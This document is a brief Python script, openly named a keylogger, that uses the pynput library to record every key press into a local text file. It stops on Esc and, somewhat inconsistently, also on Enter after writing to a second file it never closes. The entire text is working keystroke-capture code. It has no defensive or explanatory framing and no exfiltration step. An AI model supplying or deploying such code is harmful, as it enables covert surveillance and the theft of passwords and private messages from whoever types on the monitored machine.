from pynput import keyboard

def on_press(key):
    f = open("Keylogger.txt", 'a+')
    f.write(str(key) + " ")
    f.close()

def on_release(key):
    if str(key) == 'Key.esc':
        print("Exiting...")
        return False
    if str(key) == 'Key.enter':
        f = open("Keylogger last 10.txt", 'a+')
        f.write(str(key) + " ")
        return False
    

with keyboard.Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()
 
